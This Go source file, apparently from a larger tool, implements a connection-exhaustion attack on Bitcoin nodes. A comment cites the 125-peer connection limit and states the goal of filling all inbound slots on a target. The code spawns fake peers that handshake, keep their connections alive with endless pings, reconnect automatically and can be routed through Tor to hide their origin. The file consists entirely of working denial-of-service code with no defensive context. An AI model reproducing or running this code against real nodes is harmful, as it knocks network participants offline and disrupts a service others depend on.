package main

import (
	"fmt"
	"net"
	"sync/atomic"
	"time"
)

/*
Background:
https://github.com/bitcoin/bitcoin/blob/df7addc4c6e990141869c41decaf3ef98c4e45d2/src/net.h

The maximum number of peer connections to maintain.
static const unsigned int DEFAULT_MAX_PEER_CONNECTIONS = 125;

This means that if we manage to acquire 125 peers to the target, it exhausts all inbound connection slots.
*/

func slowDownTarget(target *net.TCPAddr, parallelConnections int) {
	initialSlowConnect := true

	for count := 0; count < parallelConnections; count++ {
		// Try to initially only connect 5. Then scale up!
		if count == 5 && initialSlowConnect {
			initialSlowConnect = false

			// wait until 3 active nodes
			for {
				if activeFakePeers >= 3 {
					break
				}

				time.Sleep(time.Second * 1)
			}
		}

		go fakePeerConnect(target)

		// wait for each one at least 1 second to not be too aggressive initially
		time.Sleep(time.Second * 1)
	}
}

// fakePeerConnect creates a single connection and tries to maintain it. Automated re-connect attempt.
func fakePeerConnect(target *net.TCPAddr) {
	node := NewNode(target)
	if node == nil {
		fmt.Printf("Error creating new node\n")
		return
	}

	for {
		atomic.AddInt64(&activeAttempts, 1)

		createConnectionPing(node)

		node.Close()
		atomic.AddInt64(&activeAttempts, -1)

		time.Sleep(time.Millisecond * 500)
	}
}

func createConnectionPing(node *Node) {
	var err error

	if torEnable {
		// Use proxy
		_, err = node.ConnectTor()
	} else {
		_, err = node.Connect2()
	}

	if err != nil {
		//fmt.Printf("Connect error: %v\n", err)
		// TODO: Create new stats
		return
	}

	err = node.Handshake()
	if err != nil {
		//fmt.Printf("Handshake error: %v\n", err)
		atomic.AddInt64(&handshakeErrors, 1)

		return
	}

	// valid connection
	atomic.AddInt64(&activeFakePeers, 1)
	defer atomic.AddInt64(&activeFakePeers, -1)

	for {
		time.Sleep(time.Second * 10)

		// endless ping (?)
		// This is probably very noisy and could result into auto blocking. For testing it is good enough though.
		node.Ping()
		if err != nil {
			fmt.Printf("Ping error: %v\n", err)

			return
		}

		_, err := node.receiveMessageTimeout("pong")
		if err != nil {
			//fmt.Printf("Pong error: %v\n", err)

			return
		}
	}
}

var activeFakePeers, activeAttempts int64
var handshakeErrors int64

func stats() {
	for {
		fmt.Printf("Active Fake Peers %d -- Attempts to connect %d -- Currently sleeping %d -- handshake errs %d\n", activeFakePeers, activeAttempts-activeFakePeers, numberPeerFlood-activeAttempts, handshakeErrors)

		atomic.StoreInt64(&handshakeErrors, 0) //reset

		<-time.After(time.Second * 5)
	}
}
